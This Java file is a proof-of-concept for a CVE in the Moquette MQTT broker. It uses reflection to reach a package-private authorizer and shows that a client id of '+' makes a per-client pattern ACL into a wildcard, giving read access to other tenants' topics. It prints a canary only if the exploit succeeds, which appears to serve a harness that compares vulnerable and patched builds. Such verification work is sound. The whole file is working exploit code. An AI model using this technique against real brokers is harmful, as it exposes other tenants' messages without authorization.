import io.moquette.broker.subscriptions.Topic;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

/**
 * PoC for CVE-2026-85724 (Moquette pattern-ACL identity wildcard injection).
 *
 * Fix vs. the previous attempt:
 *   The earlier PoC declared itself inside package io.moquette.broker.security so it
 *   could reach the PACKAGE-PRIVATE class AuthorizationsCollector directly. But the
 *   harness compiles the file as a top-level `public class Poc` and launches the main
 *   class `Poc` in the DEFAULT package, so a class named
 *   io.moquette.broker.security.Poc was never found ("An exception occurred while
 *   executing the Java class"). This version stays in the default package (satisfying
 *   `public class Poc`) and reaches the package-private authorizer via reflection.
 *
 * Exploit primitive (unchanged, and genuinely differential):
 *   A per-tenant rule "pattern read /weather/italy/%c" should grant each client read
 *   access ONLY to its own topic /weather/italy/<clientId>. On the vulnerable build
 *   (0.17) AuthorizationsCollector.canDoOperation substitutes the client id straight
 *   into the rule and treats the result as an MQTT topic FILTER. A client presenting
 *   the MQTT wildcard "+" as its client id turns the rule into the filter
 *   "/weather/italy/+", which matches every tenant's topic => cross-tenant read.
 *   On the patched build (0.18.1) hasTopicWildcard() skips the pattern branch
 *   (fail closed), so canRead returns false and the canary is never printed.
 *
 * canRead signature (from the fix's own tests): canRead(Topic topic, String user, String client).
 */
public class Poc {
    public static void main(String[] a) throws Exception {
        Class<?> acClass = Class.forName("io.moquette.broker.security.AuthorizationsCollector");

        Constructor<?> ctor = acClass.getDeclaredConstructor();
        ctor.setAccessible(true);
        Object authorizator = ctor.newInstance();

        // Operator intent: each client may only read its own topic under /weather/italy/.
        Method parse = acClass.getDeclaredMethod("parse", String.class);
        parse.setAccessible(true);
        parse.invoke(authorizator, "pattern read /weather/italy/%c");

        Method canRead = acClass.getDeclaredMethod("canRead", Topic.class, String.class, String.class);
        canRead.setAccessible(true);

        // Sanity: a normal client sees only its own topic (true on both builds).
        boolean legitimate = (Boolean) canRead.invoke(
            authorizator, new Topic("/weather/italy/anemometer1"), "", "anemometer1");

        // Exploit: connect with client id "+" and read a DIFFERENT client's topic.
        //   Vulnerable: "/weather/italy/%c" -> filter "/weather/italy/+" matches "/weather/italy/victim" => true
        //   Patched:    wildcard identity rejected, pattern branch skipped               => false
        boolean crossTenantRead = (Boolean) canRead.invoke(
            authorizator, new Topic("/weather/italy/victim"), "", "+");

        System.err.println("[poc] legitimate=" + legitimate + " crossTenantRead=" + crossTenantRead);

        if (legitimate && crossTenantRead) {
            // Only reachable when the vulnerability actually granted cross-tenant access.
            String canary = System.getenv("POC_CANARY");
            if (canary != null) {
                System.out.println(canary);
            }
        }
    }
}